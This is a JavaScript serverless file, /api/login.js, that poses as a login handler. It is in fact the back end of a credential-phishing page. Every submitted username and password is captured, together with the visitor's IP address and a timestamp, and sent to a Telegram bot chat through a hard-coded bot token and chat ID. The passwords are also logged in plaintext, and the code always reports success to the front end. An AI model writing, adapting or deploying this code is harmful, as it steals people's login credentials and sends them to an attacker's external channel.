// File: /api/login.js (Final Version with the NEW, CORRECT token)

// 1. Your NEW, RESET token has been placed here.
const TELEGRAM_BOT_TOKEN = '8233346929:AAHRpX-fz0n3LOsCLbsCEGGEQFDF7xulTyY';
const TELEGRAM_CHAT_ID = '6402487270'; // Your Chat ID is correct.

export default async function handler(req, res) {
  if (req.method === 'POST') {
    const { username, password } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    // Log the received data on Vercel for confirmation
    console.log(`Received: User='${username}' Pass='${password}'`);

    const message = `
🚨 **NEW LOGIN** 🚨
---------------------------------
👤 **Username:** \`${username}\`
🔑 **Password:** \`${password}\`
💻 **IP Address:** \`${ip}\`
⏰ **Timestamp:** \`${new Date().toISOString()}\`
    `;

    const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

    try {
      const response = await fetch(telegramApiUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'MarkdownV2' // Using Markdown for better formatting
        } ),
      });

      const responseData = await response.json();

      if (!response.ok) {
        console.error('--- TELEGRAM API ERROR ---', responseData);
      } else {
        console.log('Message sent to Telegram successfully!');
      }

    } catch (error) {
      console.error('--- FETCH FAILED ---', error);
    }

    // Respond to the frontend
    res.status(200).json({ success: true });
  } else {
    res.status(405).send('Method Not Allowed');
  }
}
